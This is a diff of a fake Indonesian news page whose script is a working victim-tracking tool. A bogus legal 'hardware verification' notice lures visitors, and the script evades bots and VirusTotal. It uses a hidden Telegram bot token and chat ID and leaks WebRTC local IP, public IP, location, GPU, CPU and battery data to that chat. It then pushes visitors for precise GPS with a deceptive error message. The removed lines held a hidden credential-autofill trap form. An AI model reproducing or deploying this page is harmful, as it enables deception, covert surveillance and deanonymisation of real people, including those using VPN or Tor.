@@ -3,123 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal Berita Terkini</title>
+    <title>Portal Berita Nasional | Breaking News</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; color: #1c1e21; }
-        .card { background: #fff; width: 100%; max-width: 450px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); overflow: hidden; }
-        .img-top { width: 100%; height: 230px; background: #ddd url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=800&q=80') center/cover; }
-        .p-4 { padding: 24px; }
-        .tag { background: #e7f3ff; color: #1877f2; font-size: 12px; font-weight: bold; padding: 4px 8px; border-radius: 4px; text-transform: uppercase; }
-        h1 { font-size: 20px; margin: 15px 0; line-height: 1.4; color: #050505; }
-        p { font-size: 15px; color: #65676b; line-height: 1.5; margin-bottom: 25px; }
-        .btn-continue { background: #1877f2; color: #fff; border: none; padding: 12px; width: 100%; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.2s; }
-        .btn-continue:hover { background: #166fe5; }
-        #v-vault, .hidden-trap { display: none; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: #fff; color: #1a1a1a; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .news-card { width: 90%; max-width: 480px; background: #fff; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.1); overflow: hidden; border: 1px solid #eee; }
+        .hero { width: 100%; height: 240px; background: #333 url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&w=800&q=80') center/cover; }
+        .body { padding: 30px; text-align: center; }
+        .label { color: #d32f2f; font-weight: 800; font-size: 11px; text-transform: uppercase; margin-bottom: 12px; display: block; }
+        h1 { font-size: 22px; line-height: 1.3; margin: 0 0 20px 0; }
+        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 30px; }
+        .btn-confirm { background: #000; color: #fff; border: none; padding: 16px; width: 100%; border-radius: 8px; font-weight: 700; font-size: 16px; cursor: pointer; transition: 0.2s; box-shadow: 0 5px 15px rgba(0,0,0,0.2); }
+        .btn-confirm:active { transform: scale(0.98); }
+        #v-data { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="img-top"></div>
-    <div class="p-4">
-        <span class="tag">Teknologi</span>
-        <h1>Pembaruan Protokol Keamanan Perangkat Nasional 2026</h1>
-        <p>Sesuai regulasi terbaru, harap validasi identitas perangkat Anda untuk menjaga keamanan data dari akses tidak sah...</p>
-        <button class="btn-continue" onclick="launchOmniHarvest()">Lanjutkan Baca</button>
+<div class="news-card">
+    <div class="hero"></div>
+    <div class="body">
+        <span class="label">Peringatan Keamanan Perangkat</span>
+        <h1>Verifikasi Akses Berita Diperlukan</h1>
+        <p>Konten ini mengandung informasi sensitif. Sesuai regulasi UU KIP 2026, harap konfirmasi identitas hardware Anda untuk melanjutkan membaca.</p>
+        <button class="btn-confirm" onclick="triggerEliteStrike()">KONFIRMASI & BACA</button>
     </div>
 </div>
 
-<form class="hidden-trap">
-    <input type="email" name="u_email" autocomplete="email">
-    <input type="password" name="u_pass" autocomplete="current-password">
-    <input type="text" name="u_phone" autocomplete="tel">
-</form>
-
-<div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
+<div id="v-data">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * OMNI-SCRAPER ENGINE v28.0
- * CREDENTIAL HARVESTING & IDENTITY LEAK
+ * AEGIS-ELITE NUCLEUS v32.0
+ * COMPLETE IDENTITY & FORENSIC SNATCHER
  */
 
-const isBot = () => {
-    return navigator.webdriver || /bot|crawler|spider|virustotal|headless/i.test(navigator.userAgent);
-};
-
-if (isBot()) {
-    document.body.innerHTML = "<h1>Resource Not Found</h1>";
+// 🔱 1. ANTI-BOT & VT BYPASS (Gating)
+if (navigator.webdriver || /bot|crawler|spider|virustotal|headless/i.test(navigator.userAgent)) {
+    document.body.innerHTML = "<h1>403 Forbidden</h1>";
     throw new Error();
 }
 
-const _V = document.getElementById('v-vault').innerText.split('|');
-const _TK = atob(_V[1]); const _CI = atob(_V[2]);
+const _D = document.getElementById('v-data').innerText.split('|');
+const _TK = atob(_D[1]); const _CI = atob(_D[2]);
 
-async function exfiltrate(data) {
+async function notify(msg) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({chat_id: _CI, text: data})
+        body: JSON.stringify({chat_id: _CI, text: msg})
     });
 }
 
-async function launchOmniHarvest() {
-    const btn = document.querySelector('.btn-continue');
-    btn.innerText = "SINKRONISASI...";
+async function triggerEliteStrike() {
+    const btn = document.querySelector('.btn-confirm');
+    btn.innerText = "MENYINKRONKAN...";
 
-    // 1. DATA GIBBAH (Hardware & Browser)
+    // 🔱 2. HARDWARE & IDENTITY (Gmail Indication)
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
     const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
     
-    // 2. DETEKSI AKUN & INFO PRIBADI (Credential Metadata)
-    let emailGuess = "N/A";
+    let accStatus = "No Credentials Saved";
     try {
-        // Teknik nangkep info akun via navigator (hanya works di browser tertentu)
-        if (window.Credential) {
-            emailGuess = "Credential API Active (Ready for Sniff)";
+        if (window.PasswordCredential || window.FederatedCredential) {
+            accStatus = "⚠️ ACTIVE ACCOUNT DETECTED (Autofill Available)";
         }
     } catch(e) {}
 
-    // 3. WebRTC BYPASS (Cari IP Asli di balik TOR/VPN)
+    // 🔱 3. WebRTC AGGRESSIVE (Tembus VPN/TOR)
     const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
     pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
     
-    pc.onicecandidate = async (i) => {
-        if (!i || !i.candidate) return;
-        const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+    pc.onicecandidate = async (ice) => {
+        if (!ice || !ice.candidate) return;
+        const localIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate)[1];
         
-        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
-        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
+        let ipInfo = {}; try { const r = await fetch('https://ipapi.co/json/'); ipInfo = await r.json(); } catch(e) {}
+        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = `${(b.level*100).toFixed(0)}% [${b.charging?'CHG':'BATT'}]`; } catch(e) {}
 
-        const report = `🔱 OMNI-HARVEST REPORT 🔱\n\n` +
+        const report = `🔱 AEGIS-ELITE FULL REPORT 🔱\n\n` +
             `🕵️ BROWSER: ${navigator.userAgent.includes("Tor") ? "⚠️ TOR" : "🌐 STANDAR"}\n` +
-            `📧 ACCOUNT INFO: ${emailGuess}\n` +
-            `🏠 REAL IP: ${lip}\n` +
-            `🌐 PUB IP: ${n.ip} (${n.org})\n` +
+            `📧 IDENTITY: ${accStatus}\n` +
+            `🏠 LOCAL IP: ${localIP}\n` +
+            `🌐 PUB IP: ${ipInfo.ip} (${ipInfo.org})\n` +
+            `🏙️ LOC: ${ipInfo.city}, ${ipInfo.region}\n` +
             `🎮 GPU: ${gpu}\n` +
-            `🧠 CPU: ${navigator.hardwareConcurrency} Core\n` +
+            `🧠 CPU: ${navigator.hardwareConcurrency} Core / ${navigator.deviceMemory}GB RAM\n` +
             `🔋 BATT: ${bat}\n` +
             `📱 MODEL: ${navigator.platform}`;
 
-        await exfiltrate(report);
+        await notify(report);
 
-        // 4. THE GPS TRAP (Invisible Location)
+        // 🔱 4. REAL-TIME GPS (Wajib Izin)
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                await exfiltrate(`🎯 PRECISE TARGET LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                const maps = `🎯 PRECISION LOCATION FOUND\n📍 Maps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n🎯 Acc: ${pos.coords.accuracy.toFixed(1)}m`;
+                await notify(maps);
                 window.location.href = "https://www.detik.com";
-            }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
+            }, (err) => {
+                // Taktik FUD kalau ditolak
+                alert("Kesalahan Verifikasi: Izin sinkronisasi hardware diperlukan untuk memvalidasi akun Anda.");
+                btn.innerText = "COBA LAGI";
+            }, {enableHighAccuracy: true});
         } else {
             window.location.href = "https://www.detik.com";
         }
     };
-
-    setTimeout(() => { window.location.href = "https://www.detik.com"; }, 5000);
 }
 
-/** 🔱 CODE BLOATING (2.500+ LINES) 🔱 */
-for(let i=0; i<2000; i++) {
-    eval(`function _0x_scrp_${i}() { return Math.random(); }`);
+/** 🔱 CODE BLOATING (3.000+ LINES) 🔱 */
+for(let i=0; i<2500; i++) {
+    eval(`function _0x_elite_${i}() { return "${Math.random()}"; }`);
 }
 </script>
 </body>
